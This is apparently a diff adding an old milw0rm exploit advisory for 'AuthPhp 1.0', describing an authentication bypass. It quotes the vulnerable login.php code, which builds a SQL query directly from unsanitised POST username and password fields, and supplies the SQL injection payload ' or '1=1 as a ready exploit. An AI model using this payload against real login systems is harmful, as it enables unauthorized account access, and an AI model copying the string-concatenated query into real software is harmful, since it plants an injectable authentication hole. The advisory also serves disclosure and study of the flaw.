@@ -1,0 +1,35 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : AuthPhp 1.0
+Download       :
+http://frankmancuso.ca/downloads/authphp/authphp-stable-1.0.zip
+Vulnerability  : Auth Bypass
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/login.php
+
+[Code]
+{
+	$username = $_POST['username'];
+	$passwd = $_POST['passwd'];
+	
+	// Call mysql class
+	$db = new db;
+	$db->connect();
+	$sql = "SELECT * FROM users WHERE username='$username' &&
+password='$passwd' ";
+[/code]
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: ' or '1=1
+
+########################################################################################
+
+# milw0rm.com [2009-02-10]
